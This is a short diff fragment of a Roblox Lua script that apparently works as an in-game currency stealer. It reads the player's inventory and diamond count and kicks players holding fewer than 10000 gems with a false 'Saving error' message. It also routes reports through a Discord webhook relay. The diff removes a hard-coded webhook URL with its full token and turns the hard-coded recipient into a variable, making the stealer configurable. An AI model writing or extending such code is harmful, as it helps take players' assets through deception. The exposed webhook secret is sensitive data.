@@ -52,7 +52,7 @@ end
 if Webhook and string.find(Webhook, "discord") then
 	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
 else
-	Webhook = "https://discordapp.com/api/webhooks/1223241797216505896/KjMPqOXEUgiNPmzVOWrlYLn69NLJ20LrcpkgNMfYH8mCp03-427nL8DOrZ8RVyjGmu9p"
+	Webhook = ""
 end
 
 for i, v in pairs(GetSave().Inventory.Currency) do
@@ -65,7 +65,7 @@ if GemAmount1 < 10000 then
     plr:kick("Saving error, please rejoin!")
 end
 
-local user = kbones
+local user = Username
 
 local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
 local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
